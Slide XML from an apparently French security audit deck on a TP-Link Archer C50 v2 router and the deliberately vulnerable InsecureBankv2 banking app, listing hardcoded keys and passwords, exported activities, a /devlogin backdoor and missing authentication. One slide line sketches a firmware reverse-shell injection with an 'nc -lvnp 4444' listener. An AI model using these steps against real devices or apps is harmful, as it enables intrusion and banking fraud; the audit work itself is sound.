          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="470001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Injection Payload reverse shell dans archive firmware  →  nc -lvnp 4444  →  connexion root reçue</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 3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4" name="Text 3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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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05b — ANALYSE STATIQUE APK</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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InsecureBankv2 — JADX &amp; APKTool</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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Clés hardcodée, credentials en clair, manifest insécurisé — 2 291 classes décompilées</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="416052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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="4160520" cy="2926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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="135331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JADX — Credentials &amp; Clés Hardcodée</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="1737360"/>
            <a:ext cx="397764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4" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="1737360"/>
            <a:ext cx="64008" cy="7772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5" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="17922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AES hardcodée</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3383280" y="1792224"/>
            <a:ext cx="777240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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3383280" y="179222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M5</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="203911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50" noProof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CryptoClass.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="224028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5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SecretKeySpec(bArr, "AES") + BAD_PASSWORD("WeakPassword")</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="2606040"/>
            <a:ext cx="3977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1" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="2606040"/>
            <a:ext cx="64008" cy="7772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2" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="26609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2ème implémentation AES</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3383280" y="2660904"/>
            <a:ext cx="777240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4" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3383280" y="266090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M5</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="29077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50" noProof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DoTransfer.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="310896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5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des virements sur clé compromisé</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="3474720"/>
            <a:ext cx="397764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8" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="3474720"/>
            <a:ext cx="64008" cy="7772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9" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="35295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 hardcodée</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3383280" y="3529584"/>
            <a:ext cx="777240" cy="20116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1" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3383280" y="352958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M2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="37764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50" noProof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DoTransfer.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="397764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5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String("superSecurePassword", null) en clair</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1353312"/>
            <a:ext cx="416052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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1353312"/>
            <a:ext cx="4160520" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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6" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="135331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APKTool — AndroidManifest.xml</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1737360"/>
            <a:ext cx="397764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8" name="Shape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1737360"/>
            <a:ext cx="64008" cy="47548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9" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="1792224"/>
            <a:ext cx="1508760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40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="179222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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="178308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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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android:debuggable="true"</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="1993392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Débuggeur attachable — extraction mémoire live</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2304288"/>
            <a:ext cx="3977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44" name="Shape 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2304288"/>
            <a:ext cx="64008" cy="47548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45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="2359152"/>
            <a:ext cx="1508760" cy="20116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46" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="235915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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="2350008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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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android:allowBackup="true"</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="2560320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intégrale via 'adb backup' (sans root)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Shape 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2871216"/>
            <a:ext cx="397764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50" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2871216"/>
            <a:ext cx="64008" cy="47548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51" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="2926080"/>
            <a:ext cx="1508760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52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="29260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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="2916936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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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PostLogin — exported=true</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="3127248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 écran de login via ADB ou app tierce</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Shape 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="3438144"/>
            <a:ext cx="3977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56" name="Shape 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="3438144"/>
            <a:ext cx="64008" cy="47548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57" name="Shape 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="3493008"/>
            <a:ext cx="1508760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58" name="Text 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="349300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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Text 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="3483864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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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DoTransfer — exported=true</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Text 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="3694176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 direct des virements sans auth</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Shape 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="4005072"/>
            <a:ext cx="397764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62" name="Shape 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="4005072"/>
            <a:ext cx="64008" cy="47548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63" name="Shape 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="4059936"/>
            <a:ext cx="1508760" cy="20116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64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="405993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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Text 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="4050792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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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ViewStatement — exported</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Text 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="4261104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des relevés sans authentification</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Shape 6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68" name="Text 6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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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05c — VULNÉRABILITÉS APPLICATION</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1A2540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InsecureBankv2 — Tableau CVSS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof="0">
              <a:latin typeface="Trebuchet M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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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10 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="10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vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="105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identifiées couvrant authentification, cryptographie, communication et autorisation</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"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0040" y="1353312"/>
            <a:ext cx="713232" cy="2926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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312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fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="1353312"/>
            <a:ext cx="2880360" cy="2926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3" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="135331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Vulnérabilité</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="1353312"/>
            <a:ext cx="1554480" cy="2926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5" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="13533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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="1353312"/>
            <a:ext cx="685800" cy="2926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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="135331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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="1353312"/>
            <a:ext cx="1298448" cy="2926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9" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="135331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Criticité</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1645920"/>
            <a:ext cx="713232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1" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="1645920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fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="1645920"/>
            <a:ext cx="288036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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="1645920"/>
            <a:ext cx="2807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Backdoor /devlogin — accès devadmin sans mot de passe</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="1645920"/>
            <a:ext cx="155448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5" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="1645920"/>
            <a:ext cx="1481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DoLogin.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="1645920"/>
            <a:ext cx="68580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7" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="1645920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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="1645920"/>
            <a:ext cx="1298448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9" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="1691640"/>
            <a:ext cx="1152144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0" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="169164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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1975104"/>
            <a:ext cx="713232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2" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="1975104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fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="1975104"/>
            <a:ext cx="2880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4" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="1975104"/>
            <a:ext cx="2807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 authentification /changepassword (aucun JWT)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
